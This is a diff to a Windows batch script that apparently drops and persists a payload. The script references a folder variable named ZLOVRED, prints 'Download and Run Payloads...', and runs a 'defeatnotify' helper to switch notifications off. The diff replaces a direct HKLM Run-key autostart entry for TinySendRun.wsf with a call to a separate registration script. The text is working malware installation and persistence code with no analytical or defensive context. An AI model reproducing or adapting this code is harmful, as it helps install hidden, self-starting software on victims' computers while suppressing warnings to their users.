@@ -27,6 +27,7 @@ rem
 
 rem Set Executed Script
 set CHWSF=TinySendRun.wsf
+set SCHREGBAT=nit-tinysend-register.cmd
 set CMDNOTIFY=%~dp0defeatnotify.onoff.TinySend.cmd
 rem Set Registry Node
 set RegNode=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -53,6 +54,7 @@ rem
 set LocalFolder=%ZLOVRED%
 if not exist "%LocalFolder%" echo "%LocalFolder% not Exists" && goto EndError
 if not exist "%LocalFolder%\%CHWSF%" echo "%LocalFolder%\%CHWSF% not Exists" && goto EndError
+if not exist "%LocalFolder%\%SCHREGBAT%" echo "%LocalFolder%\%SCHREGBAT% not Exists" && goto EndError
 
 rem
 echo Download and Run Payloads...
@@ -60,7 +62,8 @@ rem
 
 rem Run Script
 rem
-"%PATHCMD%\reg.exe" ADD %RegNode% /v %CHWSF% /t REG_SZ /d "%PATHCMD%\wscript.exe //NoLogo %LocalFolder%\%CHWSF%" /f
+rem "%PATHCMD%\reg.exe" ADD %RegNode% /v %CHWSF% /t REG_SZ /d "%PATHCMD%\wscript.exe //NoLogo %LocalFolder%\%CHWSF%" /f
+call "%LocalFolder%\%SCHREGBAT%"
 if ERRORLEVEL 1 goto EndError 
 %CMDNOTIFY% Off
 if ERRORLEVEL 1 goto EndError 
